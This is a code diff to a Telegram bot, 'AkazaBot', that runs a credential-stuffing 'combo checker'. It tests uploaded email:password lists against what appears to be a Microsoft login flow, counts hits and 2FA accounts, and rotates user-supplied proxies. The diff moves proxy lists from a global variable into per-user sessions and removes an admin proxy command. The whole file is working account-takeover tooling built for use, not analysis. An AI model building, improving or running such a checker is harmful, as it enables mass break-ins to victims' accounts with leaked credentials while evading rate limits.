@@ -33,9 +33,6 @@ SFTAG_URL = (
     '&display=touch&response_type=token&locale=en'
 )
 
-# Global proxy list
-PROXIES_LIST = []
-
 # Global thread pool
 bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
 
@@ -562,6 +559,7 @@ class AkazaBot:
         self.app = Application.builder().token(token).build()
         self.active_tasks = {}
         self.edit_locks = {}
+        self.user_proxies = {}
 
     async def check_user(self, update: Update):
         uid = update.effective_user.id
@@ -624,6 +622,7 @@ class AkazaBot:
 
         doc = update.message.document
         caption = update.message.caption or ""
+        uid = update.effective_user.id
         if doc.file_name.endswith('.txt'):
             file = await context.bot.get_file(doc.file_id)
             content = await file.download_as_bytearray()
@@ -631,8 +630,8 @@ class AkazaBot:
 
             if 'proxies' in doc.file_name.lower() or 'prox' in caption.lower():
                 new_proxies = [l.strip() for l in text.splitlines() if l.strip()]
-                PROXIES_LIST.clear(); PROXIES_LIST.extend(new_proxies)
-                await update.message.reply_text(f"✅ Loaded {len(new_proxies)} proxies.")
+                self.user_proxies[uid] = new_proxies
+                await update.message.reply_text(f"✅ Loaded {len(new_proxies)} proxies for this check session only.")
             else:
                 combos = [l.strip() for l in text.splitlines() if ':' in l]
                 if combos:
@@ -645,12 +644,13 @@ class AkazaBot:
         settings = akaza_db.get_user_settings(uid)
         limit = asyncio.Semaphore(settings['threads'])
 
+        user_p = self.user_proxies.pop(uid, [])
         total = len(combos)
         hits, bad, twofa, err = 0, 0, 0, 0
         checked = 0
         last_hits = []
 
-        status_msg = await update.message.reply_text("🚀 Initializing checker...")
+        status_msg = await update.message.reply_text(f"🚀 Initializing checker with {len(user_p) or 'no'} proxies...")
         self.edit_locks[status_msg.message_id] = {'lock': asyncio.Lock(), 'last_time': 0}
 
         async def update_status(force=False):
@@ -685,7 +685,7 @@ class AkazaBot:
                 if len(parts) < 2: return
                 email, password = parts[0], parts[1]
 
-                proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
+                proxy = random.choice(user_p) if user_p else None
                 checker = AkazaChecker(proxy)
 
                 res = await loop.run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
@@ -752,8 +752,7 @@ class AkazaBot:
                 "`!!info [id]`\n"
                 "`!!stats` - Global stats\n"
                 "`!!broadcast [msg]`\n"
-                "`!!setthreads [id] [n]`\n"
-                "`!!addproxies [proxies...]`"
+                "`!!setthreads [id] [n]`"
             )
             await update.message.reply_text(help_text, parse_mode='Markdown')
 
@@ -825,13 +824,6 @@ class AkazaBot:
             akaza_db.update_settings(int(parts[1]), threads=int(parts[2]))
             await update.message.reply_text(f"✅ Threads set to {parts[2]} for `{parts[1]}`")
 
-        elif cmd == '!!addproxies':
-            raw = "\n".join(parts[1:]) if len(parts) > 1 else update.message.text.split('\n', 1)[1] if '\n' in update.message.text else ""
-            new_px = [l.strip() for l in raw.splitlines() if l.strip()]
-            if new_px:
-                PROXIES_LIST.clear(); PROXIES_LIST.extend(new_px)
-                await update.message.reply_text(f"✅ Loaded {len(new_px)} proxies via command.")
-
     async def settings_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await self.check_user(update): return
         uid = update.effective_user.id
@@ -861,11 +853,12 @@ class AkazaBot:
             return
 
         email, password = combo.split(':')[:2]
-        msg = await update.message.reply_text(f"🔍 Checking `{email}`...")
-
         uid = update.effective_user.id
+        user_p = self.user_proxies.pop(uid, [])
+        msg = await update.message.reply_text(f"🔍 Checking `{email}` with {len(user_p) or 'no'} proxies...")
+
         settings = akaza_db.get_user_settings(uid)
-        proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
+        proxy = random.choice(user_p) if user_p else None
         checker = AkazaChecker(proxy)
 
         res = await asyncio.get_running_loop().run_in_executor(bot_executor, checker.check, email, password, settings['keywords'], settings['fast_mode'])
